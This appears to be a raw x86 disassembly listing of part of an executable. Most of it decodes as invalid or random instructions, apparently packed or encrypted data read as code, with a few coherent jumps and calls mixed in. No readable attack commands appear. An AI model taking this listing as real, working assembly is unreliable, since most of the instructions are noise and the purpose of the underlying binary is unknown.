  409164:	pushf  
  409165:	mov    bh,0x48
  409167:	(bad)  
  409168:	sbb    al,0xca
  40916a:	lahf   
  40916b:	scas   eax,DWORD PTR es:[edi]
  40916c:	mov    DWORD PTR [ebx+ebp*2],ecx
  40916f:	jae    0x4090f7
  409171:	adc    BYTE PTR [edi],dl
  409173:	mov    ds:0xfb5e5768,al
  409178:	stos   BYTE PTR es:[edi],al
  409179:	jg     0x4091f2
  40917b:	mov    dh,0x13
  40917d:	ins    DWORD PTR es:[edi],dx
  40917e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917f:	cmp    BYTE PTR [eax+0x302a3482],dh
  409185:	jmp    0x4091fc
  409187:	jnp    0x4091ed
  409189:	cmp    DWORD PTR [eax],esi
  40918b:	mov    ecx,0x7101b682
  409190:	in     al,0x1d
  409192:	sub    BYTE PTR [edx],0xf1
  409195:	xor    ch,BYTE PTR ds:0x5fcb013c
  40919b:	add    BYTE PTR [eax+0x3cb8b3be],dl
  4091a1:	pop    ebx
  4091a2:	aad    0x6b
  4091a4:	stos   DWORD PTR es:[edi],eax
  4091a5:	cs or  eax,0x3c633c3f
  4091ab:	jp     0x4091d2
  4091ad:	mov    eax,0xefd5585
  4091b2:	mov    edx,edi
  4091b4:	pop    ds
  4091b5:	jns    0x40922d
  4091b7:	adc    DWORD PTR [edx],esp
  4091b9:	fs sub dh,al
  4091bc:	or     ecx,DWORD PTR [esi+esi*1-0xc4f80fa]
  4091c3:	dec    esi
  4091c4:	imul   edx,DWORD PTR [esi-0x1b],0xffffffcf
  4091c8:	mov    ds:0x736938cb,eax
  4091cd:	out    0x24,al
  4091cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d0:	out    dx,eax
  4091d1:	xchg   BYTE PTR [edx+ecx*4],bh
  4091d4:	ss xchg ebx,eax
  4091d6:	test   BYTE PTR [ebx+eiz*8-0x6e],dh
  4091da:	imul   ecx,DWORD PTR [ebx+ecx*1],0xe3cc1a2f
  4091e1:	into   
  4091e2:	adc    bl,BYTE PTR ds:0xc0f6a2e5
  4091e8:	pop    edi
  4091e9:	inc    eax
  4091ea:	loope  0x409228
  4091ec:	push   ds
  4091ed:	pop    edi
  4091ee:	shl    BYTE PTR [eax-0x7d],cl
  4091f1:	sbb    eax,DWORD PTR [esi+0x4feba7ce]
  4091f7:	std    
  4091f8:	push   eax
  4091f9:	imul   ebx,esp,0x37
  4091fc:	test   al,0xf4
  4091fe:	add    DWORD PTR [ebp-0x1b],eax
  409201:	pop    esp
  409202:	dec    ecx
  409203:	pop    ebx
  409204:	pop    edx
  409205:	ins    DWORD PTR es:[edi],dx
  409206:	xor    eax,0xfbc91c9d
  40920b:	(bad)  
  40920c:	cwde   
  40920d:	xchg   DWORD PTR [eax+0x21bd057e],ebp
  409213:	or     BYTE PTR [ecx],dl
  409215:	cld    
  409216:	sahf   
  409217:	mov    eax,0xdcddef93
  40921c:	sti    
  40921d:	(bad)  
  40921e:	and    cl,BYTE PTR [ebx+ebx*2]
  409221:	cwde   
  409222:	ss clc 
  409224:	jecxz  0x4091d5
  409226:	rcr    eax,cl
  409228:	dec    edi
  409229:	(bad)  
  40922a:	out    dx,eax
  40922b:	fcomp  DWORD PTR [edx]
  40922d:	ja     0x4091f5
  40922f:	push   edx
  409230:	add    ecx,ebx
  409232:	xor    eax,ecx
  409234:	outs   dx,BYTE PTR ds:[esi]
  409235:	ja     0x4091e4
  409237:	add    ebp,DWORD PTR [esi]
  409239:	xchg   edi,eax
  40923a:	addr16 pop eax
  40923c:	inc    edx
  40923d:	fwait
  40923e:	xor    ecx,DWORD PTR [esi+0x70]
  409241:	jae    0x4091ec
  409243:	stos   BYTE PTR es:[edi],al
  409244:	mov    eax,0xbc6586a9
  409249:	inc    ebp
  40924a:	pop    ebx
  40924b:	push   ds
  40924c:	pop    ecx
  40924d:	dec    ecx
  40924e:	aam    0x42
  409250:	push   ss
  409251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409252:	cmp    dh,cl
  409254:	jmp    0x39f3:0xdc890523
  40925b:	jmp    0xb6cb:0xb487fbd3
  409262:	inc    BYTE PTR [ebx-0x78aa6631]
  409268:	repnz mov edi,0xc17d906a
  40926e:	(bad)  
  409270:	jmp    0xb4eebe14
  409275:	stos   BYTE PTR es:[edi],al
  409276:	fild   DWORD PTR [edx]
  409278:	pop    ecx
  409279:	cwde   
  40927a:	or     ch,BYTE PTR [ebx-0x38]
  40927d:	mov    BYTE PTR [ebx],al
  40927f:	pop    es
  409280:	dec    esi
  409281:	cmp    BYTE PTR [eax-0x4d],cl
  409284:	xchg   edx,eax
  409285:	and    DWORD PTR [ebp+0x68c1c7eb],0xffffffbb
  40928c:	push   cs
  40928d:	loop   0x409240
  40928f:	sbb    DWORD PTR [eax+ecx*2-0x4c],eax
  409293:	dec    ecx
  409294:	(bad)  
  409296:	xchg   ecx,eax
  409297:	(bad)  
  409298:	loopne 0x4092b5
  40929a:	dec    ebp
  40929b:	hlt    
  40929c:	pushf  
  40929d:	cmp    al,0xf
  40929f:	adc    eax,0x591ff505
  4092a4:	inc    esi
  4092a5:	sbb    DWORD PTR [esi-0x7efb0aa5],esp
  4092ab:	imul   ecx,DWORD PTR [ecx],0x16
  4092ae:	inc    edx
  4092af:	aaa    
  4092b0:	in     eax,0xef
  4092b2:	mov    BYTE PTR [edx],bl
  4092b4:	fwait
  4092b5:	(bad)  
  4092b6:	retf   
  4092b7:	cmp    esp,DWORD PTR [edi+0x1f7a9d25]
  4092bd:	mov    esp,0x71837684
  4092c2:	ret    0xae9d
  4092c5:	inc    eax
  4092c6:	stc    
  4092c7:	clc    
  4092c8:	dec    esi
  4092c9:	inc    esi
  4092ca:	ror    ah,0xca
  4092cd:	push   edi
  4092ce:	(bad)
  4092d1:	dec    eax
  4092d2:	cdq    
  4092d3:	push   eax
  4092d4:	mov    bl,0xeb
  4092d6:	add    bl,BYTE PTR [esi+edi*1+0x3abb6890]
  4092dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092de:	fnsave [esp+ebp*1+0x7a3c63ee]
  4092e5:	add    al,0x5
  4092e7:	int    0xea
  4092e9:	test   ch,ch
  4092eb:	or     eax,0x79aa284b
  4092f0:	test   al,0x1d
  4092f2:	shr    BYTE PTR [esi],cl
  4092f4:	push   ebx
  4092f5:	pop    ecx
  4092f6:	xor    ecx,DWORD PTR [esi]
  4092f8:	jne    0x409284
  4092fa:	mov    edi,DWORD PTR [ebx-0x50]
  4092fd:	pop    edx
  4092fe:	ds idiv al
  409301:	push   DWORD PTR [eax]
  409303:	lea    eax,ds:0x41b260
  409309:	push   DWORD PTR [eax]
  40930b:	lea    eax,ds:0x41b344
  409311:	push   DWORD PTR [eax]
  409313:	xchg   ebx,edx
  409315:	inc    ebx
  409316:	inc    ebx
  409317:	sub    ebx,0x3
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	add    ecx,0xe22713d9
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x4092fd
  40933a:	jmp    0xc3b94539
  40933f:	jmp    0xf34a:0xd1b8f526
  409346:	aaa    
  409347:	div    DWORD PTR [edx+0x5fd0ddc1]
  40934d:	icebp  
  40934e:	cmp    DWORD PTR [ebx+0x41],esp
  409351:	and    esi,DWORD PTR [edi+0x1bae63a6]
  409357:	sub    al,0x88
  409359:	jns    0x4093b4
  40935b:	loopne 0x4093ac
  40935d:	pop    esp
  40935e:	inc    edx
  40935f:	jmp    0xb0670e25
  409364:	scas   eax,DWORD PTR es:[edi]
  409365:	int    0x58
  409367:	mov    ecx,0xa50789d9
  40936c:	and    al,0xb3
  40936e:	mov    eax,ds:0xbb128901
  409373:	test   BYTE PTR [edx-0x80f45c0],0x7e
  40937a:	mov    bl,0x8f
  40937c:	push   esp
  40937d:	stc    
  40937e:	enter  0x6c08,0x4f
  409382:	mov    dh,0x5c
  409384:	adc    eax,DWORD PTR [ecx-0x5a]
  409387:	dec    ecx
  409388:	add    eax,0xce4e250a
  40938d:	adc    esi,ebp
  40938f:	dec    ebx
  409390:	push   ebp
  409391:	add    al,0xc1
  409393:	fnstenv [ecx+0x71]
  409396:	jge    0x409369
  409398:	xor    dh,BYTE PTR [edx-0x5b]
  40939b:	xchg   BYTE PTR [esi-0x5bf9c539],bl
  4093a1:	xchg   ebx,eax
  4093a2:	inc    ecx
  4093a3:	and    al,0x93
  4093a5:	xchg   ecx,eax
  4093a6:	cmc    
  4093a7:	cmp    ah,BYTE PTR [eax]
  4093a9:	mov    ch,0x3c
  4093ab:	push   ebx
  4093ac:	adc    BYTE PTR [edi+0x329f4a78],bl
  4093b2:	mov    ebx,0xad0222ef
  4093b7:	loopne 0x409382
  4093b9:	jl     0x409416
  4093bb:	sbb    BYTE PTR [ecx],ah
  4093bd:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4093bf:	sub    bl,BYTE PTR [edi-0x45]
  4093c2:	jnp    0x4093aa
  4093c4:	xchg   BYTE PTR [ebp-0xe],dh
  4093c7:	inc    edx
  4093c8:	(bad)  
  4093c9:	ficomp WORD PTR [eax+edx*8]
  4093cc:	sub    eax,0xc79a6b86
  4093d1:	ret    0x37d4
  4093d4:	iret   
  4093d5:	das    
  4093d6:	dec    ebx
  4093d7:	mov    cl,0x92
  4093da:	ja     0x4093eb
  4093dc:	jb     0x4093ef
  4093de:	inc    ebp
  4093df:	test   ebx,edi
  4093e1:	(bad)  
  4093e3:	mov    ch,0x82
  4093e5:	jle    0x4093e3
  4093e7:	test   DWORD PTR ss:[ebx],ebp
  4093ea:	out    0x48,al
  4093ec:	sbb    BYTE PTR [edi],ch
  4093ee:	aad    0xfd
  4093f0:	(bad)  
  4093f1:	into   
  4093f2:	dec    edi
  4093f3:	ins    BYTE PTR es:[edi],dx
  4093f4:	cmp    DWORD PTR [edi+0x7d],edi
  4093f7:	dec    esp
  4093f8:	ss inc edx
  4093fa:	out    dx,al
  4093fb:	mov    cl,0x84
  4093fd:	clc    
  4093fe:	scas   al,BYTE PTR es:[edi]
  4093ff:	jl     0x409398
  409401:	jle    0x4093b3
  409403:	sub    al,0x49
  409405:	(bad)  
  409406:	out    0x8b,al
  409408:	and    ebp,eax
  40940a:	inc    esi
  40940b:	ret    0x2fa7
  40940e:	mov    dh,BYTE PTR [ecx]
  409410:	push   ss
  409411:	inc    ebx
  409412:	jmp    0x40947d
  409414:	xchg   esp,eax
  409415:	xchg   DWORD PTR [ecx-0x2],ecx
  409418:	xchg   esi,eax
  409419:	loope  0x409446
  40941b:	push   eax
  40941c:	xchg   ecx,eax
  40941d:	xchg   esi,eax
  40941e:	pop    ds
  40941f:	inc    eax
  409420:	into   
  409421:	(bad)  
  409422:	out    dx,eax
  409423:	cdq    
  409424:	fcomp  DWORD PTR [edi]
  409426:	jns    0x40943a
  409428:	dec    ebp
  409429:	cmp    eax,0x48e77775
  40942e:	jae    0x40947b
  409430:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409432:	cs ds push esi
  409435:	mov    edi,0xde565c18
  40943a:	push   ebp
  40943b:	lock aam 0x53
  40943e:	inc    ecx
  40943f:	mul    DWORD PTR [ebx+0x10]
  409442:	jecxz  0x4093cb
  409444:	test   dh,bh
  409446:	fsubr  QWORD PTR [edx-0x69804d0f]
  40944c:	(bad)  
  40944d:	pop    edi
  40944e:	sbb    esi,DWORD PTR [esi+0x3d]
  409451:	inc    ebp
  409452:	jecxz  0x4093f5
  409454:	add    al,0xe1
  409456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409457:	adc    BYTE PTR [esi],dl
  409459:	add    dh,dh
  40945b:	cmp    DWORD PTR [ebp+0x64],edx
  40945e:	add    bh,BYTE PTR [eax]
  409460:	fild   WORD PTR [edi-0x17]
  409463:	outs   dx,DWORD PTR ds:[esi]
  409464:	pop    es
  409465:	popf   
  409466:	call   FWORD PTR [eax+ebx*1]
  409469:	pop    edx
  40946a:	(bad)  
  40946b:	jge    0x4094ea
  40946d:	xchg   ecx,eax
  40946e:	cdq    
  40946f:	jb     0x409471
  409471:	cmp    DWORD PTR [eax+0x41],ebx
  409474:	bound  esi,QWORD PTR [edi]
  409476:	rol    BYTE PTR [ecx+ebp*8],cl
  409479:	fstp   TBYTE PTR [edi-0x33]
  40947c:	push   0xffffff93
  40947e:	sub    DWORD PTR [edi-0x2fd0197f],esi
  409484:	call   0x8db3:0x74e359ad
  40948b:	aas    
  40948c:	adc    ebp,DWORD PTR [ecx]
  40948e:	and    al,0x3b
  409490:	std    
  409491:	xchg   ebp,eax
  409492:	scas   eax,DWORD PTR es:[edi]
  409493:	mov    al,0x5a
  409495:	das    
  409496:	(bad)  
  409497:	aas    
  409498:	mov    ecx,0xb04b0ca8
  40949d:	sbb    DWORD PTR [ecx+0x23],eax
  4094a0:	pop    eax
  4094a1:	push   esp
  4094a2:	inc    edi
  4094a3:	ja     0x409510
  4094a5:	mov    ebp,0x743cde56
  4094aa:	push   ebp
  4094ab:	dec    ebp
  4094ac:	and    ecx,DWORD PTR [eax-0x12]
  4094af:	inc    eax
  4094b0:	fimul  WORD PTR [eax]
  4094b2:	stos   BYTE PTR es:[edi],al
  4094b3:	sub    eax,0x4d87527e
  4094b8:	stos   DWORD PTR es:[edi],eax
  4094b9:	pusha  
  4094ba:	call   0xbc48:0x7b25f053
  4094c1:	add    al,0x82
  4094c3:	adc    dh,BYTE PTR [edi]
  4094c5:	or     bh,BYTE PTR [ebx+0x7f]
  4094c8:	(bad)  
  4094ca:	inc    ecx
  4094cb:	mov    esp,0x8357819
  4094d0:	lods   al,BYTE PTR ds:[esi]
  4094d1:	sbb    eax,0x7eec7e1
  4094d6:	mov    eax,ds:0xbd04a05a
  4094db:	and    DWORD PTR [ecx-0x2b95f9da],esi
  4094e1:	xchg   esp,eax
  4094e2:	rol    DWORD PTR [ebx+ecx*1+0x67],1
  4094e6:	addr16 ret 0xccad
  4094ea:	jmp    0x2e5:0x4217286e
  4094f1:	fistp  QWORD PTR [ebx+0x50]
  4094f4:	pop    esp
  4094f5:	fwait
  4094f6:	mov    ebx,0xaa70b7e4
  4094fb:	pop    eax
  4094fc:	jb     0x4094ae
  4094fe:	jmp    0x40951d
  409500:	(bad)  
  409501:	adc    ecx,DWORD PTR [edx+0x7d]
  409504:	add    bl,bl
  409506:	dec    esi
  409507:	dec    edi
  409508:	push   edi
  409509:	aam    0x73
  40950b:	dec    ecx
  40950c:	dec    ebx
  40950d:	sub    al,0xbd
  40950f:	fistp  DWORD PTR [edx-0x69f213b8]
  409515:	cmp    al,0xf
  409517:	das    
  409518:	imul   DWORD PTR [esi-0x59c5b778]
  40951e:	mov    dh,0xda
  409520:	aaa    
  409521:	jecxz  0x409518
  409523:	add    ch,bl
  409525:	loope  0x409588
  409527:	popa   
  409528:	leave  
  409529:	jl     0x40955c
  40952b:	shl    DWORD PTR [eax+0x6e],0x38
  40952f:	add    DWORD PTR [esi-0xf],eax
  409532:	mov    esp,0x34488333
  409537:	retf   0xdb08
  40953a:	arpl   WORD PTR [esi-0x36],cx
  40953d:	pop    ecx
  40953e:	aaa    
  40953f:	call   0x42a3e324
  409544:	js     0x409599
  409546:	cmp    eax,0x8169b3e7
  40954b:	iret   
  40954c:	xchg   BYTE PTR [edx+0x55bfee9c],cl
  409552:	mov    ?,WORD PTR [edi+eiz*8+0x73]
  409556:	(bad)  
  409557:	out    dx,eax
  409558:	fnstcw WORD PTR [edi]
  40955a:	bound  esp,QWORD PTR [ebx-0x7f]
  40955d:	fdivr  st,st(5)
  40955f:	inc    eax
  409560:	fucomp st(4)
  409562:	(bad)  
  409563:	xor    eax,0xbf7ab698
  409568:	xor    dl,BYTE PTR [ebp+0x72badae1]
  40956e:	sub    al,0xa3
  409570:	hlt    
  409571:	clc    
  409572:	fist   DWORD PTR [edx-0x3eaa368c]
  409578:	sbb    ebp,DWORD PTR [ecx-0x37]
  40957b:	test   eax,0x925b020c
  409580:	mov    ds:0xab334bf8,eax
  409585:	mov    bh,0xed
  409587:	scas   al,BYTE PTR es:[edi]
  409588:	cmp    eax,0xf15f21ed
  40958d:	sbb    eax,0x8ecfaab9
  409592:	jge    0x409536
  409594:	inc    edx
  409595:	inc    eax
  409596:	fidiv  DWORD PTR [edi+eiz*1+0x27]
  40959a:	xchg   esp,eax
  40959b:	and    al,0xad
  40959d:	ins    DWORD PTR es:[edi],dx
  40959e:	jmp    0x13a5:0x28d4ef43
  4095a5:	shl    esp,cl
  4095a7:	addr16 mov esi,0x2e825e04
  4095ad:	add    BYTE PTR [ebp+0x7b],bl
  4095b0:	cli    
  4095b1:	aaa    
  4095b2:	hlt    
  4095b3:	adc    cl,0xf1
  4095b6:	fwait
  4095b7:	out    0x2,eax
  4095b9:	out    0xd9,al
  4095bb:	dec    eax
  4095bc:	xchg   bh,al
  4095be:	imul   BYTE PTR [ebx-0x46d0188e]
  4095c4:	mov    esp,fs
  4095c6:	sub    eax,edx
  4095c8:	cmp    al,0xbf
  4095ca:	nop
  4095cb:	pop    ebp
  4095cc:	lock xor bh,BYTE PTR [edx]
  4095cf:	aam    0xa0
  4095d1:	in     al,0x1a
  4095d3:	fldenv [eax]
  4095d5:	cdq    
  4095d6:	xchg   ebx,eax
  4095d7:	and    BYTE PTR [edx],bl
  4095d9:	pop    esi
  4095da:	push   0xbd9f1008
  4095df:	popa   
  4095e0:	(bad)  
  4095e1:	bound  edi,QWORD PTR [ebx]
  4095e3:	fist   DWORD PTR [edx+0x64]
  4095e6:	retf   
  4095e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095e8:	pop    eax
  4095e9:	sub    al,0xab
  4095eb:	data16 outs dx,BYTE PTR ds:[esi]
  4095ed:	int3   
  4095ee:	retf   
  4095ef:	ret    0xebd1
  4095f2:	mul    DWORD PTR [edi+0x36]
  4095f5:	addr16 pop edi
  4095f7:	(bad)  
  4095f8:	je     0x40963b
  4095fa:	ror    DWORD PTR [ebp-0x71],1
  4095fd:	jb     0x40967a
  4095ff:	mov    esi,0x184ee774
  409604:	lods   al,BYTE PTR ds:[esi]
  409605:	adc    al,0x3
  409607:	and    al,0xc4
  409609:	adc    DWORD PTR ds:0xa44544ef,ebp
  40960f:	ds popf 
  409611:	pop    ecx
  409612:	sub    eax,0x81e29f4f
  409617:	fmul   DWORD PTR [ebp+0x2e]
  40961a:	xchg   edx,eax
  40961b:	fcomip st,st(4)
  40961d:	sub    eax,0x3f0c9bf5
  409622:	mov    al,BYTE PTR [ecx+0x6f]
  409625:	inc    esi
  409626:	and    DWORD PTR ds:0x147560bb,ecx
  40962c:	fs in  eax,dx
  40962e:	mov    al,ds:0xb5cccad0
  409633:	das    
  409634:	pop    esp
  409635:	ficom  DWORD PTR [ecx]
  409637:	(bad)  
  409638:	or     ebp,DWORD PTR [ecx-0x66]
  40963b:	ins    DWORD PTR es:[edi],dx
  40963c:	test   eax,0x32a8a0f3
  409641:	sub    DWORD PTR [esi],ebp
  409643:	push   cs
  409644:	mov    edx,0x321d3b6d
  409649:	ins    DWORD PTR es:[edi],dx
  40964a:	sub    eax,0xaf66ed72
  40964f:	repz add al,0x26
  409652:	mov    dh,0x4e
  409654:	enter  0xe99a,0xcf
  409658:	push   ebx
  409659:	jle    0x40964f
  40965b:	cmp    al,bl
  40965d:	je     0x4096b8
  40965f:	jbe    0x4096cd
  409661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409662:	pop    edx
  409663:	xor    ebp,DWORD PTR [esi-0x73]
  409666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409667:	mov    cl,BYTE PTR [eax]
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [ebp-0x27],edi
  409688:	push   edx
  409689:	xlat   BYTE PTR ds:[bx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096eb
  409693:	idiv   BYTE PTR [ebp-0x752546b7]
  409699:	dec    esp
  40969a:	mov    bl,0xfe
  40969c:	(bad)  
  40969d:	fucomp st(3)
  40969f:	pop    ebx
  4096a0:	and    bh,ah
  4096a2:	clc    
  4096a3:	xchg   edx,eax
  4096a4:	test   al,0xc
  4096a6:	dec    edx
  4096a7:	xor    edx,DWORD PTR [ebp-0x35]
  4096aa:	mov    esi,0xbaa07d8a
  4096af:	pop    ss
  4096b0:	mov    ebx,0x939b5148
  4096b5:	xlat   BYTE PTR ds:[ebx]
  4096b6:	mov    ch,0xa4
  4096b8:	fidiv  WORD PTR [edi+0x7726d5f8]
  4096be:	scas   eax,DWORD PTR es:[edi]
  4096bf:	(bad)
  4096c2:	jle    0x40970d
  4096c4:	mov    ds:0x45b23b6a,al
  4096c9:	mov    ah,0x67
  4096cb:	mov    esi,0x9e670919
  4096d0:	jo     0x409709
  4096d2:	xor    DWORD PTR [edx-0x13d0860],0xd7d5d75
  4096dc:	sahf   
  4096dd:	fcmovnbe st,st(6)
  4096df:	mov    WORD PTR [esp+ebp*4],cs
  4096e2:	test   bh,ch
  4096e4:	iret   
  4096e5:	pop    ecx
  4096e6:	sbb    DWORD PTR [edx-0x1e],ebp
  4096e9:	arpl   WORD PTR [eax+0x28],cx
  4096ec:	sub    BYTE PTR [edi],bl
  4096ee:	and    dh,BYTE PTR [ebp+esi*1-0x2]
  4096f2:	adc    dh,bh
  4096f4:	in     eax,0xf4
  4096f6:	mov    edi,0x320a2c34
  4096fb:	push   edi
  4096fc:	retf   
  4096fd:	mov    bh,0xf2
  4096ff:	cwde   
  409700:	pop    es
  409701:	test   BYTE PTR [edx-0x43f7a1a],ch
  409707:	mov    bh,0xa6
  409709:	xchg   ebp,eax
  40970a:	push   esp
  40970b:	mov    eax,ds:0xb4081117
  409710:	dec    esi
  409711:	outs   dx,DWORD PTR ds:[esi]
  409712:	inc    edi
  409713:	or     edi,0x6e
  409716:	jno    0x4096e1
  409718:	mov    edx,0x9bfcd6b9
  40971d:	push   ds
  40971e:	fnstcw WORD PTR [eax-0x4ec30500]
  409724:	xchg   cl,bh
  409726:	jbe    0x409737
  409728:	adc    ebx,DWORD PTR [edx-0x7cb99736]
  40972e:	mov    dl,0x3f
  409730:	ins    WORD PTR es:[edi],dx
  409732:	cmc    
  409733:	jmp    0x40976c
  409735:	push   eax
  409736:	mov    eax,DWORD PTR [esi+edx*4]
  409739:	sub    bh,BYTE PTR [ebp+0x65ef026b]
  40973f:	pop    eax
  409740:	xlat   BYTE PTR ds:[ebx]
  409741:	adc    eax,0x905dc969
  409746:	das    
  409747:	dec    ebx
  409748:	xchg   ebp,eax
  409749:	pop    edx
  40974a:	fsubp  st(1),st
  40974c:	adc    al,0xfe
  40974e:	mov    BYTE PTR [edi+0x54],bh
  409751:	stos   BYTE PTR es:[edi],al
  409752:	mov    dl,0xbe
  409754:	dec    eax
  409755:	retf   
  409756:	mov    ebx,0xbb40b0cb
  40975b:	inc    esi
  40975c:	or     DWORD PTR [esi-0xe4f710d],esi
  409762:	in     al,0x58
  409764:	aas    
  409765:	popf   
  409766:	xchg   esp,eax
  409767:	aas    
  409768:	jns    0x409760
  40976a:	in     eax,dx
  40976b:	retf   
  40976c:	push   es
  40976d:	or     esp,ebx
  40976f:	ss inc esp
  409771:	mov    gs,WORD PTR [edi]
  409773:	gs pop ecx
  409775:	test   DWORD PTR [edx+0x11],ebp
  409778:	cmc    
  409779:	xchg   edx,eax
  40977a:	pusha  
  40977b:	dec    ecx
  40977c:	dec    edi
  40977d:	pop    ss
  40977e:	jge    0x4097a3
  409780:	dec    edi
  409781:	(bad)  
  409782:	pop    ebx
  409783:	sbb    ch,BYTE PTR [edx]
  409785:	push   edx
  409786:	push   ebx
  409787:	sub    BYTE PTR [ecx+0x60e4429c],al
  40978d:	(bad)
  409790:	fisttp DWORD PTR [esi]
  409792:	fsub   QWORD PTR [edi-0x79]
  409795:	(bad)  
  409796:	shr    DWORD PTR [eax+0x7e6fd64c],cl
  40979c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40979d:	push   es
  40979e:	fs cmp eax,0xed324ad5
  4097a4:	jge    0x4097ec
  4097a6:	popf   
  4097a7:	mov    ss,WORD PTR [eax+edi*1-0x5a3008a3]
  4097ae:	test   BYTE PTR [edx+0x7b],ch
  4097b1:	outs   dx,DWORD PTR ds:[esi]
  4097b2:	push   ds
  4097b3:	pop    edi
  4097b4:	stos   BYTE PTR es:[edi],al
  4097b5:	pop    esi
  4097b6:	or     BYTE PTR [esi+0x3b485c0d],bh
  4097bc:	fadd   DWORD PTR [ecx+eiz*8]
  4097bf:	cmp    eax,0x4ce0a402
  4097c4:	cwde   
  4097c5:	pusha  
  4097c6:	xor    eax,0x70221503
  4097cb:	ja     0x4097c1
  4097cd:	(bad)  
  4097ce:	mov    dl,0xc8
  4097d0:	inc    eax
  4097d1:	or     al,0x68
  4097d3:	imul   edi,DWORD PTR [edx],0x58
  4097d6:	cwde   
  4097d7:	or     dl,al
  4097d9:	add    esi,DWORD PTR [eax+ebx*2-0x1484b6d7]
  4097e0:	leave  
  4097e1:	fist   DWORD PTR [edi]
  4097e3:	sub    BYTE PTR [edx+0x59e3fd4],dh
  4097e9:	cs adc ch,bl
  4097ec:	mov    bl,0xde
  4097ee:	inc    esi
  4097ef:	stc    
  4097f0:	sub    eax,0x2060af64
  4097f5:	or     al,0x2f
  4097f7:	push   ss
  4097f8:	push   edi
  4097f9:	cmc    
  4097fa:	sbb    DWORD PTR [ecx+ecx*2+0x27],esp
  4097fe:	dec    ebx
  4097ff:	or     dl,bh
  409801:	ss dec edi
  409803:	cmc    
  409804:	mov    ebp,0xe5f8b49b
  409809:	out    dx,al
  40980a:	xor    BYTE PTR [ebx+0x72],al
  40980d:	xlat   BYTE PTR ds:[ebx]
  40980e:	mov    WORD PTR [esi+0x3d50921a],gs
  409814:	pop    ss
  409815:	sar    DWORD PTR [eax-0x1c767e6e],0x38
  40981c:	jno    0x4097c9
  40981e:	mov    esi,0x2c6a3ca8
  409823:	cld    
  409824:	or     eax,0xb4171f11
  409829:	in     al,dx
  40982a:	adc    BYTE PTR [ecx+0x4a1b6f05],dl
  409830:	xchg   edi,eax
  409831:	outs   dx,BYTE PTR ds:[esi]
  409832:	sahf   
  409833:	icebp  
  409834:	mov    ?,esp
  409836:	inc    ebp
  409837:	loope  0x40987d
  409839:	mov    bl,0x7
  40983b:	cmp    DWORD PTR [edx-0x6293bf56],edx
  409841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409842:	loop   0x4098a3
  409844:	int3   
  409845:	sbb    BYTE PTR [ebp-0x6f4d9a66],0xff
  40984c:	scas   al,BYTE PTR es:[edi]
  40984d:	jae    0x4097e2
  40984f:	xor    cl,BYTE PTR ds:0x4d89e596
  409855:	add    al,0xa2
  409857:	pop    esp
  409858:	sar    DWORD PTR [esi+0x52035313],1
  40985e:	fist   DWORD PTR [eax+0x4c05b72f]
  409864:	mov    ecx,DWORD PTR [edi+eiz*8+0x5555f97d]
  40986b:	jl     0x409842
  40986d:	popa   
  40986e:	lods   al,BYTE PTR ds:[esi]
  40986f:	(bad)  
  409871:	scas   eax,DWORD PTR es:[edi]
  409872:	imul   esp,DWORD PTR ds:0x51ac3ddd,0x59
  409879:	ret    
  40987a:	mov    cs,WORD PTR [esp+ebp*2]
  40987d:	dec    esi
  40987e:	jnp    0x40982a
  409880:	or     al,0x90
  409882:	dec    edi
  409883:	inc    eax
  409884:	cmp    esp,DWORD PTR [esp+esi*8-0x25]
  409888:	daa    
  409889:	mov    eax,0xbf380d8c
  40988e:	cmc    
  40988f:	cmp    edx,DWORD PTR [eax-0x5c]
  409892:	pushf  
  409893:	mov    eax,ds:0x3c7bcd5f
  409898:	in     al,0x49
  40989a:	out    0x16,al
  40989c:	in     eax,dx
  40989d:	fs out 0x3e,eax
  4098a0:	popf   
  4098a1:	outs   dx,BYTE PTR ds:[esi]
  4098a2:	lods   eax,DWORD PTR es:[esi]
  4098a4:	imul   esi,DWORD PTR [eax],0xffffffbf
  4098a7:	in     eax,dx
  4098a8:	and    DWORD PTR [eax-0x17],ecx
  4098ab:	daa    
  4098ac:	adc    eax,0xcdf2eb09
  4098b1:	mov    al,0xb2
  4098b3:	sbb    DWORD PTR [ecx+0x602dee8a],ecx
  4098b9:	push   edx
  4098ba:	stos   DWORD PTR es:[edi],eax
  4098bb:	cmc    
  4098bc:	loop   0x40984b
  4098be:	lods   al,BYTE PTR ds:[esi]
  4098bf:	inc    esi
  4098c0:	or     al,0x18
  4098c2:	xor    BYTE PTR [ebx+edx*8+0x1],ch
  4098c6:	sub    edi,DWORD PTR [esi-0x50d4d8cc]
  4098cc:	pop    eax
  4098cd:	pop    edx
  4098ce:	pop    ecx
  4098cf:	iret   
  4098d0:	(bad)  
  4098d1:	aas    
  4098d2:	daa    
  4098d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098d4:	mov    ecx,0x52d1857
  4098d9:	push   edi
  4098da:	add    dh,BYTE PTR [ebp+0xf]
  4098dd:	jno    0x4098e2
